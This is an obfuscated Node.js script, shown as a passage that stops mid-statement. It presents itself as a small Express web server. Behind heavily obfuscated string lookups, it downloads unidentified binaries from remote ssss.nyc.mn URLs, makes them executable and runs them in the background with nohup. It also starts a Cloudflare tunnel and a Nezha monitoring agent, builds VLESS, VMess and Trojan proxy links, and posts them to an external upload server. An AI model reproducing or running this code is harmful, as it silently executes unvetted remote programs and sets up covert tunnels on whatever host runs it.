const _0x1fcea9=_0x450c;(function(_0x864d19,_0x403b84){const _0x180a36={_0x1831ff:0x127,_0x56baf3:0x198,_0x5c7ee1:0x14c,_0x106f79:0x1cb,_0x5ad093:0x116,_0x291617:0x135,_0x5d071c:0x128},_0x2d3e8f=_0x450c,_0x3ba6bf=_0x864d19();while(!![]){try{const _0x33cead=parseInt(_0x2d3e8f(0x148))/0x1*(parseInt(_0x2d3e8f(0x1b8))/0x2)+parseInt(_0x2d3e8f(0x19b))/0x3+-parseInt(_0x2d3e8f(_0x180a36._0x1831ff))/0x4*(parseInt(_0x2d3e8f(_0x180a36._0x56baf3))/0x5)+parseInt(_0x2d3e8f(_0x180a36._0x5c7ee1))/0x6*(-parseInt(_0x2d3e8f(_0x180a36._0x106f79))/0x7)+parseInt(_0x2d3e8f(_0x180a36._0x5ad093))/0x8*(parseInt(_0x2d3e8f(0x1c6))/0x9)+-parseInt(_0x2d3e8f(_0x180a36._0x291617))/0xa+parseInt(_0x2d3e8f(_0x180a36._0x5d071c))/0xb;if(_0x33cead===_0x403b84)break;else _0x3ba6bf['push'](_0x3ba6bf['shift']());}catch(_0x5cdd9c){_0x3ba6bf['push'](_0x3ba6bf['shift']());}}}(_0x50e3,0xdea53));const express=require(_0x1fcea9(0x1ad)),app=express(),axios=require(_0x1fcea9(0x12e)),os=require('os'),fs=require('fs'),path=require(_0x1fcea9(0x1aa)),{promisify}=require('util'),exec=promisify(require(_0x1fcea9(0x187))['exec']),{execSync}=require(_0x1fcea9(0x187)),UPLOAD_URL=process['env'][_0x1fcea9(0x17b)]||'',PROJECT_URL=process[_0x1fcea9(0x11c)][_0x1fcea9(0x14d)]||'',AUTO_ACCESS=process['env'][_0x1fcea9(0x10c)]||![],FILE_PATH=process[_0x1fcea9(0x11c)][_0x1fcea9(0x123)]||_0x1fcea9(0x146),SUB_PATH=process[_0x1fcea9(0x11c)][_0x1fcea9(0x1a8)]||_0x1fcea9(0x16e),PORT=process[_0x1fcea9(0x11c)][_0x1fcea9(0x114)]||process[_0x1fcea9(0x11c)][_0x1fcea9(0x11f)]||0xbb8,UUID=process[_0x1fcea9(0x11c)][_0x1fcea9(0x105)]||_0x1fcea9(0x182),NEZHA_SERVER=process[_0x1fcea9(0x11c)][_0x1fcea9(0x170)]||'',NEZHA_PORT=process[_0x1fcea9(0x11c)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1fcea9(0x11c)][_0x1fcea9(0x184)]||'',ARGO_DOMAIN=process[_0x1fcea9(0x11c)][_0x1fcea9(0x115)]||'northflank.171718.xyz',ARGO_AUTH=process[_0x1fcea9(0x11c)]['ARGO_AUTH']||_0x1fcea9(0x1b6),ARGO_PORT=process[_0x1fcea9(0x11c)][_0x1fcea9(0x168)]||0x1f41,CFIP=process[_0x1fcea9(0x11c)][_0x1fcea9(0x14b)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x1fcea9(0x1bb)]||0x1bb,NAME=process[_0x1fcea9(0x11c)][_0x1fcea9(0x1ae)]||_0x1fcea9(0x186);!fs[_0x1fcea9(0x1a7)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1fcea9(0x1b3)](FILE_PATH+_0x1fcea9(0x17e))):console[_0x1fcea9(0x1b3)](FILE_PATH+_0x1fcea9(0x13c));function generateRandomName(){const _0x58597d={_0x2a2ec5:0x177,_0x4eff0b:0x18c,_0x585403:0x1c2,_0x255c8d:0x191},_0x16693d=_0x1fcea9,_0x5efc4b='abcdefghijklmnopqrstuvwxyz';let _0x2d9446='';for(let _0x31c996=0x0;_0x31c996<0x6;_0x31c996++){_0x2d9446+=_0x5efc4b[_0x16693d(_0x58597d._0x2a2ec5)](Math[_0x16693d(_0x58597d._0x4eff0b)](Math[_0x16693d(_0x58597d._0x585403)]()*_0x5efc4b[_0x16693d(_0x58597d._0x255c8d)]));}return _0x2d9446;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1fcea9(0x19c)](FILE_PATH,webName),botPath=path[_0x1fcea9(0x19c)](FILE_PATH,botName),subPath=path[_0x1fcea9(0x19c)](FILE_PATH,'sub.txt'),listPath=path[_0x1fcea9(0x19c)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x1fcea9(0x19c)](FILE_PATH,_0x1fcea9(0x118));function deleteNodes(){const _0x73f572={_0x21eef9:0x131,_0x5eafd3:0x178,_0x155948:0x154},_0x2fafeb=_0x1fcea9;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x535944;try{_0x535944=fs[_0x2fafeb(0x174)](subPath,_0x2fafeb(0x120));}catch{return null;}const _0x8bde2=Buffer['from'](_0x535944,_0x2fafeb(_0x73f572._0x21eef9))['toString'](_0x2fafeb(0x120)),_0x4a5b14=_0x8bde2[_0x2fafeb(_0x73f572._0x5eafd3)]('\x0a')['filter'](_0x109345=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2fafeb(0x11d)](_0x109345));if(_0x4a5b14[_0x2fafeb(0x191)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2fafeb(_0x73f572._0x155948)]({'nodes':_0x4a5b14}),{'headers':{'Content-Type':'application/json'}})[_0x2fafeb(0x180)](_0x234693=>{return null;}),null;}catch(_0x1b9f24){return null;}}function cleanupOldFiles(){const _0x49dcea={_0x84e810:0x150},_0x42b9f4={_0x3f695d:0x19c,_0x4c174d:0x17a,_0x1297a1:0x18a},_0x5c97ae=_0x1fcea9;try{const _0x17f4aa=fs['readdirSync'](FILE_PATH);_0x17f4aa[_0x5c97ae(_0x49dcea._0x84e810)](_0x123cc6=>{const _0x20b825=_0x5c97ae,_0x1c9342=path[_0x20b825(_0x42b9f4._0x3f695d)](FILE_PATH,_0x123cc6);try{const _0x11acc0=fs[_0x20b825(0x1a0)](_0x1c9342);_0x11acc0[_0x20b825(_0x42b9f4._0x4c174d)]()&&fs[_0x20b825(_0x42b9f4._0x1297a1)](_0x1c9342);}catch(_0x320c7d){}});}catch(_0x12beb8){}}app['get']('/',function(_0x35d53e,_0x33c76a){const _0x525ba5={_0x4db410:0x147},_0x1b9016=_0x1fcea9;_0x33c76a[_0x1b9016(0x15a)](_0x1b9016(_0x525ba5._0x4db410));});async function generateConfig(){const _0x1f77a4={_0x2c6dc4:0x145,_0x115daa:0x10f,_0x16a539:0x189,_0x1f5135:0x1a6,_0x2ec98a:0x189,_0x457f38:0x122,_0x3fb4d5:0x117,_0xce8df2:0x15c,_0x3cd0e6:0x179,_0x3daab:0x153,_0x59dc40:0x1a3,_0x4bc153:0x138,_0x236609:0x169,_0x4f02aa:0x12f,_0x344df9:0x193,_0xcd3894:0x19c},_0x3e1123=_0x1fcea9,_0x29afa4={'log':{'access':_0x3e1123(0x1b5),'error':_0x3e1123(0x1b5),'loglevel':_0x3e1123(_0x1f77a4._0x2c6dc4)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3e1123(_0x1f77a4._0x115daa),'settings':{'clients':[{'id':UUID,'flow':_0x3e1123(0x19d)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3e1123(_0x1f77a4._0x16a539),'dest':0xbba},{'path':_0x3e1123(0x15c),'dest':0xbbb},{'path':_0x3e1123(0x149),'dest':0xbbc}]},'streamSettings':{'network':_0x3e1123(0x1a6)}},{'port':0xbb9,'listen':_0x3e1123(0x122),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x3e1123(_0x1f77a4._0x2c6dc4)},'streamSettings':{'network':_0x3e1123(_0x1f77a4._0x1f5135),'security':'none'}},{'port':0xbba,'listen':_0x3e1123(0x122),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3e1123(_0x1f77a4._0x2c6dc4)},'streamSettings':{'network':'ws','security':_0x3e1123(0x145),'wsSettings':{'path':_0x3e1123(_0x1f77a4._0x2ec98a)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e1123(0x1a3),_0x3e1123(0x17f),_0x3e1123(0x179)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3e1123(_0x1f77a4._0x457f38),'protocol':_0x3e1123(_0x1f77a4._0x3fb4d5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3e1123(_0x1f77a4._0xce8df2)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e1123(0x1a3),'tls',_0x3e1123(_0x1f77a4._0x3cd0e6)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3e1123(_0x1f77a4._0x3daab),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3e1123(_0x1f77a4._0x2c6dc4),'wsSettings':{'path':_0x3e1123(0x149)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e1123(_0x1f77a4._0x59dc40),_0x3e1123(0x17f),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3e1123(_0x1f77a4._0x4bc153)]},'outbounds':[{'protocol':_0x3e1123(0x1c7),'tag':_0x3e1123(_0x1f77a4._0x236609)},{'protocol':_0x3e1123(_0x1f77a4._0x4f02aa),'tag':_0x3e1123(0x181)}]};fs[_0x3e1123(_0x1f77a4._0x344df9)](path[_0x3e1123(_0x1f77a4._0xcd3894)](FILE_PATH,_0x3e1123(0x118)),JSON[_0x3e1123(0x154)](_0x29afa4,null,0x2));}function getSystemArchitecture(){const _0x504326={_0x15dc2c:0x151,_0x52fac9:0x10e,_0x2fe4b3:0x151},_0x25a72e=_0x1fcea9,_0x1661b3=os[_0x25a72e(0x14f)]();return _0x1661b3===_0x25a72e(_0x504326._0x15dc2c)||_0x1661b3===_0x25a72e(0x111)||_0x1661b3===_0x25a72e(_0x504326._0x52fac9)?_0x25a72e(_0x504326._0x2fe4b3):_0x25a72e(0x1b9);}function downloadFile(_0x368e68,_0x5b0cc0,_0x132204){const _0x4bcf0b={_0x2d22c8:0x1a7,_0x4faa44:0x1af,_0x2bef9e:0x15f},_0x1c5d39={_0xa7914b:0x1bd,_0x4d599c:0x11e,_0x2c9eb2:0x1c1,_0x405b2b:0x173},_0x3d6c2b={_0x3a91ea:0x173},_0x495ce6={_0x109505:0x1b7,_0x218bc3:0x1bd,_0x13a8a4:0x11e},_0xc388cd=_0x1fcea9,_0x8035ca=_0x368e68;!fs[_0xc388cd(_0x4bcf0b._0x2d22c8)](FILE_PATH)&&fs[_0xc388cd(0x14a)](FILE_PATH,{'recursive':!![]});const _0x499f78=fs[_0xc388cd(_0x4bcf0b._0x4faa44)](_0x8035ca);axios({'method':'get','url':_0x5b0cc0,'responseType':_0xc388cd(0x167)})[_0xc388cd(_0x4bcf0b._0x2bef9e)](_0x1ca59c=>{const _0x52ba94={_0x5dc4b6:0x1bd},_0x436aa1=_0xc388cd;_0x1ca59c[_0x436aa1(0x119)][_0x436aa1(0x1c4)](_0x499f78),_0x499f78['on'](_0x436aa1(0x1c3),()=>{const _0x291d96=_0x436aa1;_0x499f78[_0x291d96(_0x495ce6._0x109505)](),console[_0x291d96(0x1b3)](_0x291d96(_0x495ce6._0x218bc3)+path[_0x291d96(_0x495ce6._0x13a8a4)](_0x8035ca)+_0x291d96(0x1cc)),_0x132204(null,_0x8035ca);}),_0x499f78['on'](_0x436aa1(_0x3d6c2b._0x3a91ea),_0x223c3b=>{const _0x5e7438=_0x436aa1;fs[_0x5e7438(0x1b0)](_0x8035ca,()=>{});const _0x5abf82=_0x5e7438(_0x52ba94._0x5dc4b6)+path['basename'](_0x8035ca)+'\x20failed:\x20'+_0x223c3b[_0x5e7438(0x1c1)];console[_0x5e7438(0x173)](_0x5abf82),_0x132204(_0x5abf82);});})[_0xc388cd(0x180)](_0x4b257b=>{const _0x6b5797=_0xc388cd,_0xe51d01=_0x6b5797(_0x1c5d39._0xa7914b)+path[_0x6b5797(_0x1c5d39._0x4d599c)](_0x8035ca)+_0x6b5797(0x161)+_0x4b257b[_0x6b5797(_0x1c5d39._0x2c9eb2)];console[_0x6b5797(_0x1c5d39._0x405b2b)](_0xe51d01),_0x132204(_0xe51d01);});}async function downloadFilesAndRun(){const _0x2271ca={_0x262b1b:0x191,_0x2e3b13:0x1b3,_0x70229:0x1be,_0x5a85d2:0x140,_0x561842:0x19e,_0x4bd040:0x1a9,_0x28b789:0x10b,_0x53da59:0x16a,_0x3c81ce:0x195,_0x208e10:0x193,_0x1402ad:0x19c,_0x5c41e6:0x1a4,_0x12ff6b:0x1ba,_0x3585f2:0x171,_0x34e3ef:0x13f,_0x1f6af7:0x1b3,_0x3e4df2:0x158,_0x27f446:0x109,_0x22843d:0x12a,_0x162e88:0x139,_0x360c4a:0x13b,_0x86b524:0x190,_0x45ce85:0x143},_0x1d1644={_0x455ad2:0x150},_0x1f5fa1=_0x1fcea9,_0x57478d=getSystemArchitecture(),_0x59df4c=getFilesForArchitecture(_0x57478d);if(_0x59df4c[_0x1f5fa1(_0x2271ca._0x262b1b)]===0x0){console[_0x1f5fa1(_0x2271ca._0x2e3b13)](_0x1f5fa1(0x121));return;}const _0x38b005=_0x59df4c[_0x1f5fa1(_0x2271ca._0x70229)](_0x4f181b=>{return new Promise((_0x27b2c6,_0x376820)=>{downloadFile(_0x4f181b['fileName'],_0x4f181b['fileUrl'],(_0x562be9,_0x15d5a6)=>{_0x562be9?_0x376820(_0x562be9):_0x27b2c6(_0x15d5a6);});});});try{await Promise['all'](_0x38b005);}catch(_0x36073d){console['error']('Error\x20downloading\x20files:',_0x36073d);return;}function _0x363716(_0x5b2811){const _0x30be4f={_0x4628f6:0x106},_0x9883a4={_0x437a35:0x173,_0x2889c7:0x159,_0x54c023:0x1b3,_0x9a6fe6:0x164},_0xf71b2c=_0x1f5fa1,_0x12feb6=0x1fd;_0x5b2811[_0xf71b2c(_0x1d1644._0x455ad2)](_0x1d9c1d=>{const _0x5d8af4=_0xf71b2c;fs['existsSync'](_0x1d9c1d)&&fs[_0x5d8af4(_0x30be4f._0x4628f6)](_0x1d9c1d,_0x12feb6,_0x4424e3=>{const _0x4a82f4=_0x5d8af4;_0x4424e3?console[_0x4a82f4(_0x9883a4._0x437a35)](_0x4a82f4(_0x9883a4._0x2889c7)+_0x1d9c1d+':\x20'+_0x4424e3):console[_0x4a82f4(_0x9883a4._0x54c023)]('Empowerment\x20success\x20for\x20'+_0x1d9c1d+':\x20'+_0x12feb6[_0x4a82f4(_0x9883a4._0x9a6fe6)](0x8));});});}const _0x561e3e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x363716(_0x561e3e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1a556d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1f5fa1(0x178)](':')['pop']():'',_0x579d2d=new Set(['443',_0x1f5fa1(_0x2271ca._0x5a85d2),_0x1f5fa1(0x1ba),_0x1f5fa1(_0x2271ca._0x561842),_0x1f5fa1(_0x2271ca._0x4bd040),'2053']),_0x61bca0=_0x579d2d['has'](_0x1a556d)?_0x1f5fa1(0x13d):_0x1f5fa1(_0x2271ca._0x28b789),_0x14cb6c=_0x1f5fa1(0x1c8)+NEZHA_KEY+_0x1f5fa1(_0x2271ca._0x53da59)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x61bca0+_0x1f5fa1(_0x2271ca._0x3c81ce)+UUID;fs[_0x1f5fa1(_0x2271ca._0x208e10)](path[_0x1f5fa1(_0x2271ca._0x1402ad)](FILE_PATH,_0x1f5fa1(0x141)),_0x14cb6c);const _0x2357f2='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1f5fa1(0x157);try{await exec(_0x2357f2),console[_0x1f5fa1(0x1b3)](phpName+'\x20is\x20running'),await new Promise(_0x3a2c53=>setTimeout(_0x3a2c53,0x3e8));}catch(_0x580511){console[_0x1f5fa1(0x173)](_0x1f5fa1(0x162)+_0x580511);}}else{let _0x2286f4='';const _0x46ff41=[_0x1f5fa1(_0x2271ca._0x5c41e6),_0x1f5fa1(_0x2271ca._0x5a85d2),_0x1f5fa1(_0x2271ca._0x12ff6b),_0x1f5fa1(0x19e),'2083',_0x1f5fa1(0x1c5)];_0x46ff41[_0x1f5fa1(0x1a5)](NEZHA_PORT)&&(_0x2286f4=_0x1f5fa1(0x14e));const _0x402c2d='nohup\x20'+npmPath+_0x1f5fa1(0x17c)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2286f4+_0x1f5fa1(_0x2271ca._0x3585f2);try{await exec(_0x402c2d),console[_0x1f5fa1(_0x2271ca._0x2e3b13)](npmName+_0x1f5fa1(0x12a)),await new Promise(_0x1cecec=>setTimeout(_0x1cecec,0x3e8));}catch(_0x3514f9){console[_0x1f5fa1(0x173)](_0x1f5fa1(_0x2271ca._0x34e3ef)+_0x3514f9);}}}else console[_0x1f5fa1(_0x2271ca._0x1f6af7)](_0x1f5fa1(_0x2271ca._0x3e4df2));const _0xd4c22f='nohup\x20'+webPath+_0x1f5fa1(_0x2271ca._0x27f446)+FILE_PATH+_0x1f5fa1(0x12d);try{await exec(_0xd4c22f),console[_0x1f5fa1(0x1b3)](webName+_0x1f5fa1(_0x2271ca._0x22843d)),await new Promise(_0x49ceeb=>setTimeout(_0x49ceeb,0x3e8));}catch(_0x544c8f){console[_0x1f5fa1(0x173)]('web\x20running\x20error:\x20'+_0x544c8f);}if(fs['existsSync'](botPath)){let _0x4ac011;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4ac011=_0x1f5fa1(0x12c)+ARGO_AUTH;else ARGO_AUTH[_0x1f5fa1(0x12b)](/TunnelSecret/)?_0x4ac011=_0x1f5fa1(_0x2271ca._0x162e88)+FILE_PATH+_0x1f5fa1(_0x2271ca._0x360c4a):_0x4ac011=_0x1f5fa1(_0x2271ca._0x86b524)+FILE_PATH+_0x1f5fa1(_0x2271ca._0x45ce85)+ARGO_PORT;try{await exec(_0x1f5fa1(0x13e)+botPath+'\x20'+_0x4ac011+'\x20>/dev/null\x202>&1\x20&'),console[_0x1f5fa1(0x1b3)](botName+_0x1f5fa1(0x12a)),await new Promise(_0x5ced82=>setTimeout(_0x5ced82,0x7d0));}catch(_0xdb2c8){console['error'](_0x1f5fa1(0x15e)+_0xdb2c8);}}await new Promise(_0x214401=>setTimeout(_0x214401,0x1388));}function getFilesForArchitecture(_0x145155){const _0x244f60={_0x4e446d:0x183,_0x56ee20:0x18b,_0x48b990:0x151,_0xd05682:0x197,_0x3dde7a:0x1ca},_0x129d76=_0x1fcea9;let _0x52e785;_0x145155===_0x129d76(0x151)?_0x52e785=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x129d76(0x165)}]:_0x52e785=[{'fileName':webPath,'fileUrl':_0x129d76(_0x244f60._0x4e446d)},{'fileName':botPath,'fileUrl':_0x129d76(_0x244f60._0x56ee20)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1848aa=_0x145155===_0x129d76(_0x244f60._0x48b990)?'https://arm64.ssss.nyc.mn/agent':_0x129d76(0x18d);_0x52e785[_0x129d76(_0x244f60._0xd05682)]({'fileName':npmPath,'fileUrl':_0x1848aa});}else{const _0x24a177=_0x145155===_0x129d76(0x151)?_0x129d76(0x18f):_0x129d76(_0x244f60._0x3dde7a);_0x52e785[_0x129d76(0x197)]({'fileName':phpPath,'fileUrl':_0x24a177});}}return _0x52e785;}function argoType(){const _0xfc3aff={_0x6d45e5:0x166,_0xf95d9d:0x132,_0x448107:0x13a,_0x10279d:0x193},_0x3990b6=_0x1fcea9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3990b6(0x1b3)](_0x3990b6(_0xfc3aff._0x6d45e5));return;}if(ARGO_AUTH[_0x3990b6(0x1a5)]('TunnelSecret')){fs[_0x3990b6(0x193)](path['join'](FILE_PATH,_0x3990b6(_0xfc3aff._0xf95d9d)),ARGO_AUTH);const _0xbad79c=_0x3990b6(0x163)+ARGO_AUTH['split']('\x22')[0xb]+_0x3990b6(0x1bf)+path[_0x3990b6(0x19c)](FILE_PATH,_0x3990b6(_0xfc3aff._0xf95d9d))+_0x3990b6(_0xfc3aff._0x448107)+ARGO_DOMAIN+_0x3990b6(0x1c9)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3990b6(_0xfc3aff._0x10279d)](path['join'](FILE_PATH,_0x3990b6(0x10d)),_0xbad79c);}else console['log'](_0x3990b6(0x133));}function _0x450c(_0x9548a3,_0x111058){const _0x50e388=_0x50e3();return _0x450c=function(_0x450ce4,_0x5a3709){_0x450ce4=_0x450ce4-0x105;let _0x36d2ad=_0x50e388[_0x450ce4];return _0x36d2ad;},_0x450c(_0x9548a3,_0x111058);}async function extractDomains(){const _0x543695={_0xa62ed4:0x10a,_0x55d084:0x120,_0x53faa0:0x178,_0xce41ae:0x191,_0x476b7b:0x134,_0x59e9d0:0x18a,_0x2008c5:0x10a,_0x4cea7f:0x143,_0x22d0b4:0x13e,_0xddbee:0x1b3,_0x3a124f:0x155},_0x1f810c={_0x15c4e5:0x19f,_0x285249:0x11b,_0x521ae6:0x144,_0x209575:0x19f,_0x5a7fee:0x119,_0x418be3:0x196,_0x476150:0x113,_0x480add:0x144},_0xceed4e={_0x1ff2d9:0x16f,_0x1e1834:0x17d,_0x446c4d:0x177,_0x5065cc:0x199},_0x5635f3={_0x22b99b:0x129},_0x5b9030=_0x1fcea9;let _0x2f70c3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2f70c3=ARGO_DOMAIN,console[_0x5b9030(0x1b3)]('ARGO_DOMAIN:',_0x2f70c3),await _0x3e3281(_0x2f70c3);else try{const _0x171ecb=fs[_0x5b9030(0x174)](path[_0x5b9030(0x19c)](FILE_PATH,_0x5b9030(_0x543695._0xa62ed4)),_0x5b9030(_0x543695._0x55d084)),_0x13e34e=_0x171ecb[_0x5b9030(_0x543695._0x53faa0)]('\x0a'),_0x4dda2f=[];_0x13e34e['forEach'](_0x124c41=>{const _0x1b4689=_0x5b9030,_0xe584b2=_0x124c41[_0x1b4689(0x12b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xe584b2){const _0x22693e=_0xe584b2[0x1];_0x4dda2f[_0x1b4689(_0x5635f3._0x22b99b)](_0x22693e);}});if(_0x4dda2f[_0x5b9030(_0x543695._0xce41ae)]>0x0)_0x2f70c3=_0x4dda2f[0x0],console[_0x5b9030(0x1b3)](_0x5b9030(0x110),_0x2f70c3),await _0x3e3281(_0x2f70c3);else{console[_0x5b9030(0x1b3)](_0x5b9030(_0x543695._0x476b7b)),fs[_0x5b9030(_0x543695._0x59e9d0)](path[_0x5b9030(0x19c)](FILE_PATH,_0x5b9030(_0x543695._0x2008c5)));async function _0x3b7462(){const _0x5f2632=_0x5b9030;try{process[_0x5f2632(0x172)]==='win32'?await exec(_0x5f2632(_0xceed4e._0x1ff2d9)+botName+_0x5f2632(0x108)):await exec(_0x5f2632(_0xceed4e._0x1e1834)+botName[_0x5f2632(_0xceed4e._0x446c4d)](0x0)+']'+botName['substring'](0x1)+_0x5f2632(_0xceed4e._0x5065cc));}catch(_0x1e2b73){}}_0x3b7462(),await new Promise(_0x4d61e7=>setTimeout(_0x4d61e7,0xbb8));const _0xdc9477=_0x5b9030(0x190)+FILE_PATH+_0x5b9030(_0x543695._0x4cea7f)+ARGO_PORT;try{await exec(_0x5b9030(_0x543695._0x22d0b4)+botPath+'\x20'+_0xdc9477+_0x5b9030(0x1ac)),console[_0x5b9030(_0x543695._0xddbee)](botName+'\x20is\x20running'),await new Promise(_0x9668d=>setTimeout(_0x9668d,0xbb8)),await extractDomains();}catch(_0x3bc92){console[_0x5b9030(0x173)]('Error\x20executing\x20command:\x20'+_0x3bc92);}}}catch(_0x1ffac9){console[_0x5b9030(0x173)](_0x5b9030(_0x543695._0x3a124f),_0x1ffac9);}async function _0x3d76e7(){const _0x8e612d=_0x5b9030;try{const _0x8d0a6c=await axios[_0x8e612d(_0x1f810c._0x15c4e5)](_0x8e612d(_0x1f810c._0x285249),{'timeout':0xbb8});if(_0x8d0a6c[_0x8e612d(0x119)]&&_0x8d0a6c[_0x8e612d(0x119)][_0x8e612d(0x1b2)]&&_0x8d0a6c['data'][_0x8e612d(_0x1f810c._0x521ae6)])return _0x8d0a6c[_0x8e612d(0x119)][_0x8e612d(0x1b2)]+'_'+_0x8d0a6c['data']['org'];}catch(_0x49782c){try{const _0x35c617=await axios[_0x8e612d(_0x1f810c._0x209575)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x35c617[_0x8e612d(_0x1f810c._0x5a7fee)]&&_0x35c617[_0x8e612d(0x119)][_0x8e612d(_0x1f810c._0x418be3)]===_0x8e612d(0x1a2)&&_0x35c617[_0x8e612d(0x119)][_0x8e612d(_0x1f810c._0x476150)]&&_0x35c617[_0x8e612d(_0x1f810c._0x5a7fee)][_0x8e612d(_0x1f810c._0x480add)])return _0x35c617[_0x8e612d(_0x1f810c._0x5a7fee)]['countryCode']+'_'+_0x35c617[_0x8e612d(0x119)]['org'];}catch(_0x38cf2c){}}return _0x8e612d(0x107);}async function _0x3e3281(_0x435127){const _0x545079={_0x5129a1:0x145,_0x5bc07c:0x126,_0x2fe2e1:0x15d,_0x3f39d7:0x164,_0x249a98:0x131,_0x29707f:0x15b,_0x5abcd3:0x188,_0x460b2f:0x15d,_0x41e2b6:0x185,_0x418725:0x164,_0x51b941:0x164,_0x372a33:0x19f},_0x22228e=await _0x3d76e7(),_0x215c99=NAME?NAME+'-'+_0x22228e:_0x22228e;return new Promise(_0x3aae0a=>{setTimeout(()=>{const _0xc2a396={_0x9364f0:0x15a},_0x25171a=_0x450c,_0x417d99={'v':'2','ps':''+_0x215c99,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x25171a(_0x545079._0x5129a1),'net':'ws','type':_0x25171a(_0x545079._0x5129a1),'host':_0x435127,'path':_0x25171a(0x175),'tls':'tls','sni':_0x435127,'alpn':'','fp':'firefox'},_0x175004=_0x25171a(0x16d)+UUID+'@'+CFIP+':'+CFPORT+_0x25171a(_0x545079._0x5bc07c)+_0x435127+_0x25171a(_0x545079._0x2fe2e1)+_0x435127+_0x25171a(0x112)+_0x215c99+_0x25171a(0x152)+Buffer['from'](JSON[_0x25171a(0x154)](_0x417d99))[_0x25171a(_0x545079._0x3f39d7)](_0x25171a(_0x545079._0x249a98))+_0x25171a(_0x545079._0x29707f)+UUID+'@'+CFIP+':'+CFPORT+_0x25171a(_0x545079._0x5abcd3)+_0x435127+_0x25171a(_0x545079._0x460b2f)+_0x435127+_0x25171a(0x1a1)+_0x215c99+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x25171a(_0x545079._0x41e2b6)](_0x175004)[_0x25171a(_0x545079._0x418725)](_0x25171a(0x131))),fs['writeFileSync'](subPath,Buffer[_0x25171a(0x185)](_0x175004)[_0x25171a(_0x545079._0x51b941)](_0x25171a(0x131))),console[_0x25171a(0x1b3)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x25171a(_0x545079._0x372a33)]('/'+SUB_PATH,(_0x264dcc,_0x35f3ad)=>{const _0x263e16=_0x25171a,_0x2cf639=Buffer['from'](_0x175004)[_0x263e16(0x164)]('base64');_0x35f3ad['set'](_0x263e16(0x16c),_0x263e16(0x160)),_0x35f3ad[_0x263e16(_0xc2a396._0x9364f0)](_0x2cf639);}),_0x3aae0a(_0x175004);},0x7d0);});}}async function uploadNodes(){const _0x11f879={_0x446f06:0x18e,_0x47b13b:0x196,_0x1e12ad:0x1b3,_0xff5b22:0x11a,_0x40b350:0x192,_0x301948:0x1b3},_0x2add5d=_0x1fcea9;if(UPLOAD_URL&&PROJECT_URL){const _0x2b9c54=PROJECT_URL+'/'+SUB_PATH,_0x2978ab={'subscription':[_0x2b9c54]};try{const _0x510f84=await axios[_0x2add5d(0x11a)](UPLOAD_URL+'/api/add-subscriptions',_0x2978ab,{'headers':{'Content-Type':_0x2add5d(_0x11f879._0x446f06)}});return _0x510f84&&_0x510f84[_0x2add5d(_0x11f879._0x47b13b)]===0xc8?(console[_0x2add5d(_0x11f879._0x1e12ad)](_0x2add5d(0x136)),_0x510f84):null;}catch(_0x128497){if(_0x128497['response']){if(_0x128497['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4bd3aa=fs[_0x2add5d(0x174)](listPath,_0x2add5d(0x120)),_0x31393a=_0x4bd3aa['split']('\x0a')[_0x2add5d(0x1c0)](_0x486d6d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2add5d(0x11d)](_0x486d6d));if(_0x31393a[_0x2add5d(0x191)]===0x0)return;const _0x45d9e4=JSON['stringify']({'nodes':_0x31393a});try{const _0x1fcbb4=await axios[_0x2add5d(_0x11f879._0xff5b22)](UPLOAD_URL+_0x2add5d(_0x11f879._0x40b350),_0x45d9e4,{'headers':{'Content-Type':'application/json'}});return 